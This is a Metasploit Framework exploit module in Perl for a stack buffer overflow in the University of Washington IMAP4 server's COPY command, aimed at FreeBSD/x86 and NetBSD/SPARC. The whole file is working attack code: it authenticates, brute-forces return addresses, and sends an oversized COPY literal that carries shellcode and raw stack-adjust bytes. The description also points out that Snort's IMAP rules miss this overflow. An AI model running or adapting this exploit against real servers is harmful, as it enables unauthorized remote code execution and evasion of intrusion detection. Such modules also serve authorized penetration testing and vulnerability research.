
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::uow_imap4_copy;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
{
	'Name'  => 'University of Washington IMap4 COPY Buffer Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'vlad902 <vlad902 [at] gmail.com>', ],
	'Arch'  => [ 'x86', 'sparc' ],
	'OS'    => [ 'bsd' ],
	'Priv'  => 0,
	'UserOpts'  => {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 143],
		'USER'  => [1, 'DATA', 'User name'],
		'PASS'  => [1, 'DATA', 'Password'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	},
	'Payload' => {
		'Space' => 1000,
		'MinNops' => 700,
		'BadChars' => "\x00\n",				# \n needed?
		'Keys' => ['+findsock', '+execve'],
	},
	'Description'  => Pex::Text::Freeform(qq{
		This exploits a buffer overflow in the COPY command. An overly long
		argument causes a classic stack buffer overflow.

		Snort's imap.rules detects the LIST, RENAME, LSUB, and FIND overflows 
		but does not catch COPY.
	}),
	'Refs'  =>  [  
		['BID', 1110],
	],
	'Targets' => [ 
		[ "FreeBSD / x86", 0xbfbffcd0, 0xbf100000, 700, 1096, \&Payloadx86 ],
		[ "NetBSD / SPARC", 0xeffffcd0, 0xefa00000, 720, 1084, \&PayloadSPARC ],
	],
	'Keys'  => ['imapd', 'inetd'],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $target_user = $self->GetVar('USER');
	my $target_pass = $self->GetVar('PASS');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	my $curr_ret;

	$self->PrintLine(sprintf("[*] Starting brute force mode for target %s (%s).", $target->[0], $target_host));

	for (
		$curr_ret  = $target->[1];
		$curr_ret >= $target->[2];
		$curr_ret -= $target->[3]
	)
	{
		my $s = Msf::Socket::Tcp->new
		(
			'PeerAddr'  => $target_host, 
			'PeerPort'  => $target_port, 
			'LocalPort' => $self->GetVar('CPORT'),
			'SSL'       => $self->GetVar('SSL'),
		);
		if ($s->IsError) {
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

# Clear the socket
		$s->Recv(-1);

		$s->Send(sprintf("1 LOGIN \"%s\" \"%s\"\r\n", $target_user, $target_pass));
		my $reply = $s->Recv(-1);
		if(!$reply || !($reply =~ /1 OK/))
		{
			$self->PrintLine('[*] Authentication error.');
			return;
		}

		$s->Send("1 SELECT MISC\r\n");
		my $reply = $s->Recv(-1);
		if(!$reply || $reply =~ /1 NO/)
		{
			$s->Send("1 CREATE MISC\r\n");
			$s->Send("1 SELECT MISC\r\n");
		}

		$self->PrintLine(sprintf("[*] Trying return address 0x%.8x...", $curr_ret));
		$s->Send(sprintf("1 UID COPY 1:2 {%i}\r\n", $target->[4] + 1));
		$s->Send("0" . $target->[5]->($self, $curr_ret, $shellcode) . "\r\n");

		$self->Handler($s);
		$s->Close();
		undef($s);
		undef($reply);
	}

	return;
}



sub Payloadx86 {
	my $self = shift;
	my $ret = shift;
	my $sc = shift;

	my $buf;

# XXX: More precision.
	$buf = $sc . pack("V", $ret) x 24;

	return $buf;
}

sub PayloadSPARC {
	my $self = shift;
	my $ret = shift;
	my $sc = shift; 

	my $buf;

# We need more nops for padding (Yay for stack frames.) so we re-use the first.
	$buf = $self->MakeNops(20) . $sc . pack("N", $ret) x 16;

	return $buf;
}

sub PayloadPrependEncoder {
	my $self = shift;
	my $target_idx  = $self->GetVar('TARGET');
	my $target = $self->Targets->[$target_idx];

	if($target->[0] =~ /x86/)
	{
		return "\x66\x81\xec\xe8\x03";
	}
	elsif($target->[0] =~ /SPARC/)
	{
		return "\x9c\x23\xa3\xe8";
	}
}
